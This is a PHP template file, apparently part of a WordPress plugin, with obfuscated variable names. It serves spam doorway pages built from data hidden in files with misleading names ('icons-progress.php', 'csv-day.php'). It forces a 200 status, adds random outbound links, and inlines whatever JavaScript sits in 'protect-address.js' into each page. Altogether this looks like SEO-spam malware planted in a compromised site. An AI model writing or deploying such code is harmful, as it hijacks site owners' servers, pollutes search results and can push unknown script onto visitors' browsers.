<?php
$a19kacrnzq = intval(get_query_var('hqtofzjhc'));

if ($a19kacrnzq < 1 || $a19kacrnzq > 5479) return;
$nJRttQYS4 = file(plugin_dir_path(__FILE__).'icons-progress.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$mOHgh = explode(';', $nJRttQYS4[$a19kacrnzq]);
if (count($mOHgh) < 2) return;
$a0Xyr5Pl8 = $mOHgh[0];
$olnxHzb  = $mOHgh[1];
$eaDv4fVARP = $mOHgh[2];
$rjIByW  = $mOHgh[3];
$y2v1Cahmy = $mOHgh[4];
set_query_var('oweew', $a0Xyr5Pl8);

$uijWGu = '';
$s9h4AOCDLG = plugin_dir_path(__FILE__).'csv-day.php';
if (is_file($s9h4AOCDLG)) {
	$eUJA89 = file($s9h4AOCDLG, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($eUJA89);
	shuffle($eUJA89);
	$gLy12T = mt_rand(2, 5);
	if (count($eUJA89) > $gLy12T) {
		for ($btrxH = 0; $btrxH < $gLy12T; $btrxH++) {
			$dUczr = array_shift($eUJA89);
			$uijWGu .= '<p><a href="'.$dUczr.'">'.$dUczr.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $a0Xyr5Pl8; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $olnxHzb . "</p>\n";
				if (strlen($rjIByW) > 0) echo "<p>" . $rjIByW . "</p>\n";
				if (strlen($eaDv4fVARP) > 0) echo "<p>" . $eaDv4fVARP . "</p>\n";
				if (strlen($y2v1Cahmy) > 0) echo '<p><a href="#"><img src="'.$y2v1Cahmy.'"></a>' . "</p>\n";
				echo $uijWGu;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$sJxQ3c = plugin_dir_path(__FILE__) . 'protect-address.js';
if (is_file($sJxQ3c)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($sJxQ3c);
	echo '</script>';
}
get_footer();
?>
